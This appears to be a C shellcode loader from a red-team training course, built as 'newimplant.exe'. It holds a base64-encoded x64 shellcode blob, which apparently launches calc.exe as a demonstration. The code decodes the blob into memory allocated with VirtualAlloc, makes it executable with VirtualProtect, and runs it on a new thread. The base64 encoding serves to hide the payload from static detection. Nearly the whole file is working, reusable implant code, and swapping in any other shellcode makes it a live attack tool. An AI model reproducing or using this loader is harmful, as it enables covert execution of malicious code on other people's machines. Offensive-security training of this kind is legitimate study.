/*

Based on RTO Course from Sektor 7 Institute. 

https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc
https://docs.microsoft.com/en-us/windows/win32/devnotes/rtlmovememory
https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect
https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread
https://docs.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitforsingleobject

https://docs.microsoft.com/en-us/windows/win32/api/wincrypt/nf-wincrypt-cryptstringtobinarya



@ECHO OFF

cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tcnewimplant.cpp /link /OUT:newimplant.exe /SUBSYSTEM:CONSOLE /MACHINE:x64
*/
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <Wincrypt.h>
#pragma comment (lib, "Crypt32.lib")

unsigned char payload[] = "/EiD5PDowAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdCLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpV////11IugEAAAAAAAAASI2NAQEAAEG6MYtvh//Vu/C1olZBuqaVvZ3/1UiDxCg8BnwKgPvgdQW7RxNyb2oAWUGJ2v/VY2FsYy5leGUA";
unsigned int payload_lenth = sizeof(payload);

int Base64Decode( const BYTE * payload, unsigned int srcLen, char * exec_payload, unsigned int destLen ){

	DWORD out;
	BOOL fRet;

	out = destLen;
	fRet = CryptStringToBinary((LPCSTR) payload, srcLen, CRYPT_STRING_BASE64, exec_payload, &out, NULL, NULL);

	if (!fRet) out = 0; //Failed to decode
	return(out);

}


int wmain(void){

LPVOID exec_payload;
BOOL vp;
PDWORD lpflOldProtect = 0;
HANDLE new_thread;

printf("\nsize of payload is: %d\n", payload_lenth);


exec_payload = VirtualAlloc(0, payload_lenth, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

if (exec_payload != NULL) {
    printf("\ngood call to VirtualAlloc\n");
} else {
    printf("\nVirtual Alloc didnt work :/ \n");
    exit(-1);
};



printf("\nDebug Breakpoint 1!\n");
getchar();    

Base64Decode((const BYTE *)payload, payload_lenth, (char *)exec_payload, payload_lenth);

vp = VirtualProtect(exec_payload, payload_lenth, PAGE_EXECUTE_READ, &lpflOldProtect);

if (vp == 0){
    printf("\nfailed to virtualprotect\n");
    exit(-1);
} else {
    printf("\nvirtual protect g2g\n");

printf("%-20s : 0x%-016p\n", "payload addr", (void *)payload);
printf("%-20s : 0x%-016p\n", "exec_mem addr", (void *)exec_payload);

printf("\nDebug Breakpoint 2!\n");
getchar();    

    new_thread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_payload, 0,0,0);
    if (new_thread == NULL){
        printf("\nCreateThread failed :/ \n");
        exit(-1);
    } else {
    printf("\nCreateThread worked!\n");
    WaitForSingleObject(new_thread, -1);
}

};
};